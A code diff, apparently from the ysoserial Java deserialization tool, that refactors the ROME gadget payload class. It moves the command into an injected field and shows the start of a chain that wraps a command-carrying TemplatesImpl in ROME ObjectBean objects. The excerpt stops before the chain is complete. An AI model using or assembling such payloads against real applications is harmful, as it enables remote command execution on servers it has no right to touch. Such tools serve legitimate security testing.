@@ -5,6 +5,8 @@ import javax.xml.transform.Templates;
 
 import com.sun.syndication.feed.impl.ObjectBean;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -29,8 +31,18 @@ import ysoserial.payloads.util.PayloadRunner;
  */
 @Dependencies("rome:rome:1.0")
 public class ROME implements ObjectPayload<Object> {
+	
+	@Bind private String command;
 
-    public Object getObject ( String command ) throws Exception {
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
+
+
+	public Object getObject ( ) throws Exception {
         Object o = Gadgets.createTemplatesImpl(command);
         ObjectBean delegate = new ObjectBean(Templates.class, o);
         ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
